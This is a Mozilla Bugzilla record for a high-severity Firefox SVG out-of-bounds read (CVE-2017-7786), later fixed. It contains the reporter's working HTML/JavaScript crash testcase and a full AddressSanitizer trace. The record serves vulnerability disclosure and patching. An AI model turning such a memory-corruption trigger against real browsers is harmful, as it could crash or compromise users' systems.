
30 Branch

[Platform:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#rep_platform)

Unspecified

Unspecified

[Type:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_type)

defect

[Priority:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#priority)

*Not set*

[Severity:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_severity)

normal

Points:

---

## Tracking

### ()

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED
FIXED

[Status:](https://wiki.mozilla.org/BMO/UserGuide/BugStatuses)

VERIFIED

FIXED

Mark as Assigned

[Milestone:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#target_milestone)

mozilla56

Iteration:

---

[Project Flags:](https://wiki.mozilla.org/BMO/UserGuide#Project_Flags)

| Performance Impact | --- |
| --- | --- |
| Webcompat Score | --- |
| a11y-review | --- |
| Accessibility Severity | --- |
| Webcompat Priority | --- |

[Tracking Flags:](https://wiki.mozilla.org/BMO/UserGuide#Tracking_Flags)

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr45 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox_esr45&o1=equals&v1=wontfix) |
| firefox-esr52 | [55+](/buglist.cgi?f1=cf_tracking_firefox_esr52&o1=equals&v1=55%2B) | [verified](/buglist.cgi?f1=cf_status_firefox_esr52&o1=equals&v1=verified) |
| firefox53 | --- | [wontfix](/buglist.cgi?f1=cf_status_firefox53&o1=equals&v1=wontfix) |
| firefox54 | [+](/buglist.cgi?f1=cf_tracking_firefox54&o1=equals&v1=%2B) | [wontfix](/buglist.cgi?f1=cf_status_firefox54&o1=equals&v1=wontfix) |
| firefox55 | [+](/buglist.cgi?f1=cf_tracking_firefox55&o1=equals&v1=%2B) | [verified](/buglist.cgi?f1=cf_status_firefox55&o1=equals&v1=verified) |
| firefox56 | --- | [verified](/buglist.cgi?f1=cf_status_firefox56&o1=equals&v1=verified) |

|  | Tracking | Status |
| --- | --- | --- |
| firefox-esr45 |  | wontfix |
| relnote-firefox |  | --- |
| thunderbird\_esr115 | --- | --- |
| thunderbird\_esr128 | --- | --- |
| firefox-esr52 | 55+ | verified |
| firefox53 |  | wontfix |
| firefox-esr115 | --- | --- |
| firefox54 | + | wontfix |
| firefox-esr128 | --- | --- |
| firefox55 | + | verified |
| firefox56 |  | verified |
| firefox134 | --- | --- |
| firefox135 | --- | --- |
| firefox136 | --- | --- |

## People

### (Reporter: nils, Assigned: jwatt)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

![](extensions/Gravatar/web/default.jpg)  [jwatt](/user_profile?user_id=32767)

[Assignee:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#assigned_to)

Reset Assignee to default

[Mentors:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_mentor)

---

[QA Contact:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#qa_contact)

Reset QA Contact to default

[Reporter:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#reporter)

![](https://secure.gravatar.com/avatar/1ac8e01cc88bca015e51fbd49a0b2df5?d=mm&size=40)  [nils](/user_profile?user_id=344130)

[Triage Owner:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#triage_owner)

![](extensions/Gravatar/web/default.jpg)  [jwatt](/user_profile?user_id=32767)

[CC:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#cc)

14 people

## References

[Depends on:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#dependson)

---

[Blocks:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#blocks)

---

[Regressions:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regresses)

---

[Regressed by:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#regressed_by)

---

[URL:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#bug_file_loc)

[See Also:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#see_also)

---

## Details

### (Keywords: csectype-bounds, reporter-external, sec-high, Whiteboard: [adv-main55+][adv-esr52.3+][post-critsmash-triage])

[Alias:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#alias)

CVE-2017-7786

[Keywords:](/describekeywords.cgi)

[csectype-bounds](/buglist.cgi?keywords=csectype-bounds&resolution=---),
[reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---),
[sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

[Whiteboard:](https://wiki.mozilla.org/BMO/UserGuide/Whiteboard)

[adv-main55+][adv-esr52.3+][post-critsmash-triage]

QA Whiteboard:

---

Has STR:

---

Change Request:

---

[Votes:](https://wiki.mozilla.org/BMO/UserGuide/BugFields#votes)

0

Bug Flags:

| [dveditz](/user_profile?user_id=1689) | [sec-bounty](#a4787235_1689 "8 years ago") | + |
| --- | --- | --- |
| [dveditz](/user_profile?user_id=1689) | sec-bounty | + |
| --- | --- | --- |
| [RyanVM](/user_profile?user_id=75935) | [in-testsuite](#c13 "8 years ago") | ? |
| --- | --- | --- |
| [RyanVM](/user_profile?user_id=75935) | in-testsuite | ? |
| --- | --- | --- |
| [mwobensmith](/user_profile?user_id=452604) | [qe-verify](#a6631972_452604 "7 years ago") | + |
| --- | --- | --- |
| [mwobensmith](/user_profile?user_id=452604) | qe-verify | + |
| --- | --- | --- |
|  | behind-pref |  |
| --- | --- | --- |
|  | firefox-backlog |  |
|  | sec-bounty-hof |  |
|  | in-qa-testsuite |  | | |

## Crash Data

Signature:

*None*

## Security

### (public)

This bug is publicly visible.

## User Story

## Attachments

### (7 files, 5 obsolete files)

| [crash.html (testcase, crashes firefox)](/attachment.cgi?id=8868038)  [8 years ago](#c0)  [Nils](/user_profile?user_id=344130)   1.08 KB, text/html |  | [Details](/attachment.cgi?id=8868038&action=edit) |
| --- | --- | --- |
| [ASAN output](/attachment.cgi?id=8868039)  [8 years ago](#c1)  [Nils](/user_profile?user_id=344130)   18.07 KB, text/plain |  | [Details](/attachment.cgi?id=8868039&action=edit) |
| [simplified testcase](/attachment.cgi?id=8868950)  [8 years ago](#c4)  [Jonathan Watt [:jwatt]](/user_profile?user_id=32767)   319 bytes, text/html |  | [Details](/attachment.cgi?id=8868950&action=edit) |
| [part 1 - Prevent painting of non-displayable SVG elements](/attachment.cgi?id=8868981)  [8 years ago](#c5)  [Jonathan Watt [:jwatt]](/user_profile?user_id=32767)   2.98 KB, patch | dholbert : [review+](#c8 "8 years ago") | [Details](/attachment.cgi?id=8868981&action=edit) | [Diff](/attachment.cgi?id=8868981&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1365189&attachment=8868981) |
| [part 2 - Add crashtest for crash painting non-displayable SVG element as background image](/attachment.cgi?id=8868982)  [8 years ago](#c6)  [Jonathan Watt [:jwatt]](/user_profile?user_id=32767)   739 bytes, patch |  | [Details](/attachment.cgi?id=8868982&action=edit) | [Diff](/attachment.cgi?id=8868982&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1365189&attachment=8868982) |
| [part 2 - Add crashtest for crash painting non-displayable SVG element as background image](/attachment.cgi?id=8868983)  [8 years ago](#c7)  [Jonathan Watt [:jwatt]](/user_profile?user_id=32767)   1.13 KB, patch | dholbert : [review+](#c9 "8 years ago") | [Details](/attachment.cgi?id=8868983&action=edit) | [Diff](/attachment.cgi?id=8868983&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1365189&attachment=8868983) |
| [part 1 - Prevent painting of non-displayable SVG elements [r=dholbert]](/attachment.cgi?id=8871200)  [8 years ago](#c11)  [Jonathan Watt [:jwatt]](/user_profile?user_id=32767)   3.14 KB, patch | jwatt : [review+](#c11 "8 years ago")  abillings : [sec-approval+](#a897421_280903 "8 years ago") | [Details](/attachment.cgi?id=8871200&action=edit) | [Diff](/attachment.cgi?id=8871200&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1365189&attachment=8871200) |
| [part 1 - Prevent painting of non-displayable SVG elements](/attachment.cgi?id=8879644)  [8 years ago](#c21)  [Jonathan Watt [:jwatt]](/user_profile?user_id=32767)   3.21 KB, patch | dholbert : [review+](#c22 "8 years ago") | [Details](/attachment.cgi?id=8879644&action=edit) | [Diff](/attachment.cgi?id=8879644&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1365189&attachment=8879644) |
| [part 1 - Prevent SVG elements that are neither displayable nor paint servers from painting [r=dholbert]](/attachment.cgi?id=8879650)  [8 years ago](#c23)  [Jonathan Watt [:jwatt]](/user_profile?user_id=32767)   3.24 KB, patch | jwatt : [review+](#c23 "8 years ago")  ritu : [approval-mozilla-beta+](#c33 "8 years ago")  ritu : [approval-mozilla-esr52+](#c33 "8 years ago")  abillings : [sec-approval+](#c29 "8 years ago") | [Details](/attachment.cgi?id=8879650&action=edit) | [Diff](/attachment.cgi?id=8879650&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1365189&attachment=8879650) |
| [part 1 patch for mozilla-beta](/attachment.cgi?id=8879677)  [8 years ago](#c24)  [Jonathan Watt [:jwatt]](/user_profile?user_id=32767)   3.25 KB, patch |  | [Details](/attachment.cgi?id=8879677&action=edit) | [Diff](/attachment.cgi?id=8879677&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1365189&attachment=8879677) |
| [part 1 patch for mozilla-esr52](/attachment.cgi?id=8879678)  [8 years ago](#c25)  [Jonathan Watt [:jwatt]](/user_profile?user_id=32767)   3.23 KB, patch |  | [Details](/attachment.cgi?id=8879678&action=edit) | [Diff](/attachment.cgi?id=8879678&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1365189&attachment=8879678) |
| [part 1 patch for mozilla-release (in the off chance we wanted to take this as a ridealong)](/attachment.cgi?id=8879681)  [8 years ago](#c27)  [Jonathan Watt [:jwatt]](/user_profile?user_id=32767)   3.29 KB, patch |  | [Details](/attachment.cgi?id=8879681&action=edit) | [Diff](/attachment.cgi?id=8879681&action=diff) | [Splinter Review](/page.cgi?id=splinter.html&ignore=&bug=1365189&attachment=8879681) |

Show Obsolete

Bottom ↓
Tags ▾

* Reset

Timeline ▾

* Reset
* Collapse All
* Expand All
* Comments Only

|  | [Nils](/user_profile?user_id=344130)  Reporter |  |
| --- | --- | --- |
| [Description](/show_bug.cgi?id=1365189#c0)• 8 years ago |
|  | |

Attached file
[crash.html (testcase, crashes firefox)](attachment.cgi?id=8868038) (obsolete)
— [Details](attachment.cgi?id=8868038&action=edit)

The following testcase crashes the latest ASAN build of Firefox.
<script>
function start() {
o0=document.createElement('iframe');
o0.src="data:text/html,<html><svg xmlns='<http://www.w3.org/2000/svg>'></svg></html>";
o0.addEventListener('load', fun0,false);
document.body.appendChild(o0);
o3=document;
}
function fun0() {
o6=o0.contentDocument;
o7=o6.getElementsByTagName('\*')[3];
o316=document.documentElement;
o3.designMode='on';
document.replaceChild(o6.documentElement,window.top.document.documentElement);
o1024=document.createElementNS('[http://www.w3.org/2000/svg','filter](http://www.w3.org/2000/svg%27%2C%27filter)');
o1024.setAttribute('id','id0');
o1031=document.createElementNS('[http://www.w3.org/2000/svg','feMerge](http://www.w3.org/2000/svg%27%2C%27feMerge)');
o1039=document.createElementNS('[http://www.w3.org/2000/svg','feMergeNode](http://www.w3.org/2000/svg%27%2C%27feMergeNode)');
o1031.appendChild(o1039);
o1024.appendChild(o1031);
o7.appendChild(o1024);
o1039.style.filter='url(#id0)';
o316.style.filter='url(#id7)';
o1039.id='id20';
o610=document.createElement('style');
o611=document.createTextNode("\*{ background: -moz-element(#id20);");
o610.appendChild(o611);
document.documentElement.appendChild(o610);
}
</script>
<body onload="start()"></body>
ASAN output:
=================================================================
==28350==ERROR: AddressSanitizer: global-buffer-overflow on address 0x7fd26840d038 at pc 0x7fd2615b5745 bp 0x7fff4bdc59b0 sp 0x7fff4bdc59a8
READ of size 8 at 0x7fd26840d038 thread T0 (Web Content)
#0 0x7fd2615b5744 in mozilla::SVGGeometryFrame::GetCanvasTM() /home/worker/workspace/build/src/layout/svg/SVGGeometryFrame.cpp:701:52
#1 0x7fd2616446ac in nsSVGUtils::GetCanvasTM(nsIFrame\*) /home/worker/workspace/build/src/layout/svg/nsSVGUtils.cpp:428:50
#2 0x7fd2615eb37f in nsFilterInstance::GetPreFilterNeededArea(nsIFrame\*, nsRegion const&) /home/worker/workspace/build/src/layout/svg/nsFilterInstance.cpp:114:18
#3 0x7fd2616225ae in nsSVGIntegrationUtils::GetRequiredSourceForInvalidArea(nsIFrame\*, nsRect const&) /home/worker/workspace/build/src/layout/svg/nsSVGIntegrationUtils.cpp:354:10
#4 0x7fd2612926cb in nsIFrame::BuildDisplayListForStackingContext(nsDisplayListBuilder\*, nsRect const&, nsDisplayList\*) /home/worker/workspace/build/src/layout/generic/nsFrame.cpp:2448:7
#5 0x7fd26110ba2c in nsLayoutUtils::PaintFrame(nsRenderingContext\*, nsIFrame\*, nsRegion const&, unsigned int, nsDisplayListBuilderMode, nsLayoutUtils::PaintFrameFlags) /home/worker/workspace/build/src/layout/base/nsLayoutUtils.cpp:3598:15
#6 0x7fd26162a025 in PaintFrameCallback::operator()(gfxContext\*, gfxRect const&, mozilla::gfx::SamplingFilter, gfxMatrix const&) /home/worker/workspace/build/src/layout/svg/nsSVGIntegrationUtils.cpp:1200:3
#7 0x7fd25ca35358 in gfxCallbackDrawable::Draw(gfxContext\*, gfxRect const&, mozilla::gfx::ExtendMode, mozilla::gfx::SamplingFilter, double, gfxMatrix const&) /home/worker/workspace/build/src/gfx/thebes/gfxDrawable.cpp:172:16
#8 0x7fd25ca34c26 in gfxCallbackDrawable::MakeSurfaceDrawable(mozilla::gfx::SamplingFilter) /home/worker/workspace/build/src/gfx/thebes/gfxDrawable.cpp:129:5
#9 0x7fd25ca351a5 in gfxCallbackDrawable::Draw(gfxContext\*, gfxRect const&, mozilla::gfx::ExtendMode, mozilla::gfx::SamplingFilter, double, gfxMatrix const&) /home/worker/workspace/build/src/gfx/thebes/gfxDrawable.cpp:163:28
#10 0x7fd25cbae754 in gfxUtils::DrawPixelSnapped(gfxContext\*, gfxDrawable\*, gfxSize const&, mozilla::image::ImageRegion const&, mozilla::gfx::SurfaceFormat, mozilla::gfx::SamplingFilter, unsigned int, double) /home/worker/workspace/build/src/gfx/thebes/gfxUtils.cpp:584:15
#11 0x7fd25cc30e40 in mozilla::image::DynamicImage::Draw(gfxContext\*, mozilla::gfx::IntSizeTyped<mozilla::gfx::UnknownUnits> const&, mozilla::image::ImageRegion const&, unsigned int, mozilla::gfx::SamplingFilter, mozilla::Maybe<mozilla::SVGImageContext> const&, unsigned int, float) /home/worker/workspace/build/src/image/DynamicImage.cpp:238:5
#12 0x7fd2611226da in DrawImageInternal(gfxContext&, nsPresContext\*, imgIContainer\*, mozilla::gfx::SamplingFilter, nsRect const&, nsRect const&, nsPoint const&, nsRect const&, mozilla::Maybe<mozilla::SVGImageContext> const&, unsigned int, mozilla::gfx::ExtendMode, float) /home/worker/workspace/build/src/layout/base/nsLayoutUtils.cpp:6692:22
#13 0x7fd26112685b in nsLayoutUtils::DrawImage(gfxContext&, nsPresContext\*, imgIContainer\*, mozilla::gfx::SamplingFilter, nsRect const&, nsRect const&, nsPoint const&, nsRect const&, unsigned int, float) /home/worker/workspace/build/src/layout/base/nsLayoutUtils.cpp:6925:10
#14 0x7fd261971480 in mozilla::nsImageRenderer::Draw(nsPresContext\*, nsRenderingContext&, nsRect const&, nsRect const&, nsRect const&, nsPoint const&, nsSize const&, mozilla::gfx::IntRectTyped<mozilla::CSSPixel> const&, float) /home/worker/workspace/build/src/layout/painting/nsImageRenderer.cpp:544:9
#15 0x7fd2618c158b in mozilla::nsImageRenderer::DrawLayer(nsPresContext\*, nsRenderingContext&, nsRect const&, nsRect const&, nsPoint const&, nsRect const&, nsSize const&, float) /home/worker/workspace/build/src/layout/painting/nsImageRenderer.cpp:706:10
#16 0x7fd2618b927d in nsCSSRendering::PaintStyleImageLayerWithSC(nsCSSRendering::PaintBGParams const&, nsRenderingContext&, nsStyleContext\*, nsStyleBorder const&) /home/worker/workspace/build/src/layout/painting/nsCSSRendering.cpp:2721:30
#17 0x7fd2618b72e9 in nsCSSRendering::PaintStyleImageLayer(nsCSSRendering::PaintBGParams const&, nsRenderingContext&) /home/worker/workspace/build/src/layout/painting/nsCSSRendering.cpp:1943:10
#18 0x7fd261927229 in nsDisplayBackgroundImage::PaintInternal(nsDisplayListBuilder\*, nsRenderingContext\*, nsRect const&, nsRect\*) /home/worker/workspace/build/src/layout/painting/nsDisplayList.cpp:3689:5
#19 0x7fd26123d158 in nsDisplayCanvasBackgroundImage::Paint(nsDisplayListBuilder\*, nsRenderingContext\*) /home/worker/workspace/build/src/layout/generic/nsCanvasFrame.cpp:390:3
#20 0x7fd26189a639 in mozilla::FrameLayerBuilder::PaintItems(nsTArray<mozilla::FrameLayerBuilder::ClippedDisplayItem>&, mozilla::gfx::IntRectTyped<mozilla::gfx::UnknownUnits> const&, gfxContext\*, nsRenderingContext\*, nsDisplayListBuilder\*, nsPresContext\*, mozilla::gfx::IntPointTyped<mozilla::gfx::UnknownUnits> const&, float, float, int) /home/worker/workspace/build/src/layout/painting/FrameLayerBuilder.cpp:6036:21
#21 0x7fd26189d114 in mozilla::FrameLayerBuilder::DrawPaintedLayer(mozilla::layers::PaintedLayer\*, gfxContext\*, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, mozilla::layers::DrawRegionClip, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, void\*) /home/worker/workspace/build/src/layout/painting/FrameLayerBuilder.cpp:6211:19
#22 0x7fd25c8199da in mozilla::layers::ClientPaintedLayer::PaintThebes(nsTArray<mozilla::layers::ReadbackProcessor::Update>\*) /home/worker/workspace/build/src/gfx/layers/client/ClientPaintedLayer.cpp:86:5
#23 0x7fd25c81a656 in mozilla::layers::ClientPaintedLayer::RenderLayerWithReadback(mozilla::layers::ReadbackProcessor\*) /home/worker/workspace/build/src/gfx/layers/client/ClientPaintedLayer.cpp:140:3
#24 0x7fd25c84b66f in mozilla::layers::ClientContainerLayer::RenderLayer() /home/worker/workspace/build/src/gfx/layers/client/ClientContainerLayer.h:57:29
#25 0x7fd25c815096 in mozilla::layers::ClientLayerManager::EndTransactionInternal(void (\*)(mozilla::layers::PaintedLayer\*, gfxContext\*, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, mozilla::layers::DrawRegionClip, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, void\*), void\*, mozilla::layers::LayerManager::EndTransactionFlags) /home/worker/workspace/build/src/gfx/layers/client/ClientLayerManager.cpp:375:13
#26 0x7fd25c815907 in mozilla::layers::ClientLayerManager::EndTransaction(void (\*)(mozilla::layers::PaintedLayer\*, gfxContext\*, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, mozilla::layers::DrawRegionClip, mozilla::gfx::IntRegionTyped<mozilla::gfx::UnknownUnits> const&, void\*), void\*, mozilla::layers::LayerManager::EndTransactionFlags) /home/worker/workspace/build/src/gfx/layers/client/ClientLayerManager.cpp:433:3
#27 0x7fd261910f47 in nsDisplayList::PaintRoot(nsDisplayListBuilder\*, nsRenderingContext\*, unsigned int) /home/worker/workspace/build/src/layout/painting/nsDisplayList.cpp:2292:17
#28 0x7fd26110ca1e in nsLayoutUtils::PaintFrame(nsRenderingContext\*, nsIFrame\*, nsRegion const&, unsigned int, nsDisplayListBuilderMode, nsLayoutUtils::PaintFrameFlags) /home/worker/workspace/build/src/layout/base/nsLayoutUtils.cpp:3721:12
#29 0x7fd2610127f6 in mozilla::PresShell::Paint(nsView\*, nsRegion const&, unsigned int) /home/worker/workspace/build/src/layout/base/PresShell.cpp:6498:5
#30 0x7fd2608729b2 in nsViewManager::ProcessPendingUpdatesPaint(nsIWidget\*) /home/worker/workspace/build/src/view/nsViewManager.cpp:481:19
#31 0x7fd260871915 in nsViewManager::ProcessPendingUpdatesForView(nsView\*, bool) /home/worker/workspace/build/src/view/nsViewManager.cpp:413:33
#32 0x7fd2608752b5 in nsViewManager::ProcessPendingUpdates() /home/worker/workspace/build/src/view/nsViewManager.cpp:1095:5
#33 0x7fd260f735a8 in nsRefreshDriver::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:1985:11
#34 0x7fd260f7e973 in mozilla::RefreshDriverTimer::TickRefreshDrivers(long, mozilla::TimeStamp, nsTArray<RefPtr<nsRefreshDriver> >&) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:300:7
#35 0x7fd260f7e644 in mozilla::RefreshDriverTimer::Tick(long, mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:322:5
#36 0x7fd260f80cfb in RunRefreshDrivers /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:753:5
#37 0x7fd260f80cfb in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::TickRefreshDriver(mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:666
#38 0x7fd260f808a5 in mozilla::VsyncRefreshDriverTimer::RefreshDriverVsyncObserver::NotifyVsync(mozilla::TimeStamp) /home/worker/workspace/build/src/layout/base/nsRefreshDriver.cpp:567:9
#39 0x7fd2617a4542 in mozilla::layout::VsyncChild::RecvNotify(mozilla::TimeStamp const&) /home/worker/workspace/build/src/layout/ipc/VsyncChild.cpp:67:16
#40 0x7fd25ba765e9 in mozilla::layout::PVsyncChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PVsyncChild.cpp:155:20
#41 0x7fd25b7349a4 in mozilla::ipc::PBackgroundChild::OnMessageReceived(IPC::Message const&) /home/worker/workspace/build/src/obj-firefox/ipc/ipdl/PBackgroundChild.cpp:1630:28
#42 0x7fd25b68cf64 in mozilla::ipc::MessageChannel::DispatchAsyncMessage(IPC::Message const&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2040:25
#43 0x7fd25b689df7 in mozilla::ipc::MessageChannel::DispatchMessage(IPC::Message&&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1975:17
#44 0x7fd25b68bb04 in mozilla::ipc::MessageChannel::RunMessage(mozilla::ipc::MessageChannel::MessageTask&) /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1844:5
#45 0x7fd25b68c136 in mozilla::ipc::MessageChannel::MessageTask::Run() /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:1877:15
#46 0x7fd25a8ef8a0 in nsThread::ProcessNextEvent(bool, bool\*) /home/worker/workspace/build/src/xpcom/threads/nsThread.cpp:1270:14
#47 0x7fd25a8ec2e8 in NS\_ProcessNextEvent(nsIThread\*, bool) /home/worker/workspace/build/src/xpcom/threads/nsThreadUtils.cpp:393:10
#48 0x7fd25b694f21 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate\*) /home/worker/workspace/build/src/ipc/glue/MessagePump.cpp:96:21
#49 0x7fd25b5f3c50 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message\_loop.cc:238:10
#50 0x7fd25b5f3c50 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message\_loop.cc:231
#51 0x7fd25b5f3c50 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message\_loop.cc:211
#52 0x7fd2608eda8f in nsBaseAppShell::Run() /home/worker/workspace/build/src/widget/nsBaseAppShell.cpp:156:27
#53 0x7fd264139fb7 in XRE\_RunAppShell() /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:893:22
#54 0x7fd25b5f3c50 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message\_loop.cc:238:10
#55 0x7fd25b5f3c50 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message\_loop.cc:231
#56 0x7fd25b5f3c50 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message\_loop.cc:211
#57 0x7fd264139ae5 in XRE\_InitChildProcess(int, char\*\*, XREChildData const\*) /home/worker/workspace/build/src/toolkit/xre/nsEmbedFunctions.cpp:709:34
#58 0x4eb7a3 in content\_process\_main /home/worker/workspace/build/src/browser/app/../../ipc/contentproc/plugin-container.cpp:64:30
#59 0x4eb7a3 in main /home/worker/workspace/build/src/browser/app/nsBrowserApp.cpp:285
#60 0x7fd27633082f in \_\_libc\_start\_main /build/glibc-9tT8Do/glibc-2.23/csu/../csu/libc-start.c:291
#61 0x41d0f8 in \_start (/home/nils/fuzzer3/firefox/firefox+0x41d0f8)
0x7fd26840d038 is located 0 bytes to the right of global variable 'vtable for SVGFEContainerFrame' defined in '/home/worker/workspace/build/src/obj-firefox/layout/svg/Unified\_cpp\_layout\_svg0.cpp' (0x7fd26840cba0) of size 1176
SUMMARY: AddressSanitizer: global-buffer-overflow /home/worker/workspace/build/src/layout/svg/SVGGeometryFrame.cpp:701:52 in mozilla::SVGGeometryFrame::GetCanvasTM()
Shadow bytes around the buggy address:
0x0ffacd0799b0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x0ffacd0799c0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x0ffacd0799d0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x0ffacd0799e0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x0ffacd0799f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
=>0x0ffacd079a00: 00 00 00 00 00 00 00[f9]f9 f9 f9 f9 f9 f9 f9 f9
0x0ffacd079a10: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9
0x0ffacd079a20: f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 00 00 00 00
0x0ffacd079a30: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x0ffacd079a40: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
0x0ffacd079a50: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
Shadow byte legend (one shadow byte represents 8 application bytes):
Addressable: 00
Partially addressable: 01 02 03 04 05 06 07
Heap left redzone: fa
Heap right redzone: fb
Freed heap region: fd
Stack left redzone: f1
Stack mid redzone: f2
Stack right redzone: f3
Stack partial redzone: f4
Stack after return: f5
Stack use after scope: f8
Global redzone: f9
Global init order: f6
Poisoned by user: f7
Container overflow: fc
Array cookie: ac
Intra object redzone: bb
ASan internal: fe
Left alloca redzone: ca
Right alloca redzone: cb
==28350==ABORTING
[Parent 27963] WARNING: pipe error (57): Connection reset by peer: file /home/worker/workspace/build/src/ipc/chromium/src/chrome/common/ipc\_channel\_posix.cc, line 353
[Parent 27963] WARNING: pipe error (53): Connection reset by peer: file /home/worker/workspace/build/src/ipc/chromium/src/chrome/common/ipc\_channel\_posix.cc, line 353
###!!! [Parent][MessageChannel] Error: (msgtype=0x2C0081,name=PBrowser::Msg\_Destroy) Channel error: cannot send/recv
ASAN:DEADLYSIGNAL
=================================================================
==28371==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000000 (pc 0x7f4597a8f767 bp 0x7f4593c62380 sp 0x7f4593c62370 T2)
==28371==The signal is caused by a WRITE memory access.
==28371==Hint: address points to the zero page.
#0 0x7f4597a8f766 in mozilla::ipc::MessageChannel::OnChannelErrorFromLink() /home/worker/workspace/build/src/ipc/glue/MessageChannel.cpp:2465:13
#1 0x7f4597a948b7 in OnChannelError /home/worker/workspace/build/src/ipc/glue/MessageLink.cpp:368:12
#2 0x7f4597a948b7 in non-virtual thunk to mozilla::ipc::ProcessLink::OnChannelError() /home/worker/workspace/build/src/ipc/glue/MessageLink.cpp:360
#3 0x7f4597a40c71 in event\_persist\_closure /home/worker/workspace/build/src/ipc/chromium/src/third\_party/libevent/event.c:1580:9
#4 0x7f4597a40c71 in event\_process\_active\_single\_queue /home/worker/workspace/build/src/ipc/chromium/src/third\_party/libevent/event.c:1639
#5 0x7f4597a383d9 in event\_process\_active /home/worker/workspace/build/src/ipc/chromium/src/third\_party/libevent/event.c:1741:9
#6 0x7f4597a383d9 in event\_base\_loop /home/worker/workspace/build/src/ipc/chromium/src/third\_party/libevent/event.c:1961
#7 0x7f45979f8acd in base::MessagePumpLibevent::Run(base::MessagePump::Delegate\*) /home/worker/workspace/build/src/ipc/chromium/src/base/message\_pump\_libevent.cc:373:7
#8 0x7f45979f3c50 in RunInternal /home/worker/workspace/build/src/ipc/chromium/src/base/message\_loop.cc:238:10
#9 0x7f45979f3c50 in RunHandler /home/worker/workspace/build/src/ipc/chromium/src/base/message\_loop.cc:231
#10 0x7f45979f3c50 in MessageLoop::Run() /home/worker/workspace/build/src/ipc/chromium/src/base/message\_loop.cc:211
#11 0x7f4597a11e3f in base::Thread::ThreadMain() /home/worker/workspace/build/src/ipc/chromium/src/base/thread.cc:179:16
#12 0x7f4597a0129c in ThreadFunc(void\*) /home/worker/workspace/build/src/ipc/chromium/src/base/platform\_thread\_posix.cc:38:13
#13 0x7f45b37846b9 in start\_thread (/lib/x86\_64-linux-gnu/libpthread.so.0+0x76b9)
#14 0x7f45b280d82c in clone /build/glibc-9tT8Do/glibc-2.23/misc/../sysdeps/unix/sysv/linux/x86\_64/clone.S:109
AddressSanitizer can not provide additional info.
